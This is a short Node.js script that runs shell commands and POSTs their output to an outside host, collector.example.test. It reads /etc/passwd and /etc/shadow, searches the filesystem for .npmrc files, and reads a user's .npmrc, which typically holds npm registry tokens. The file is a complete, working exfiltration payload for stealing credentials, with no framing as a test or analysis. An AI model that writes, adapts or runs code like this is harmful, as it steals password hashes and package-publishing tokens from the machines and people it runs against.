const { execSync } = require('child_process');
const http = require('http');
const fs = require('fs');

function exfilCmd(cmd) {
  const output = execSync(cmd).toString();
  const data = `CMD: ${cmd}\nOUT: ${output}`;
  const req = http.request({
    hostname: 'collector.example.test',
    port: 80,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
  });
  req.write(data);
  req.end();
}

exfilCmd('cat /etc/passwd');
exfilCmd('cat /etc/shadow');
exfilCmd('find / -type f -iname "*.npmrc"');
exfilCmd(fs.readFileSync('/home/user/.npmrc', 'utf8'));
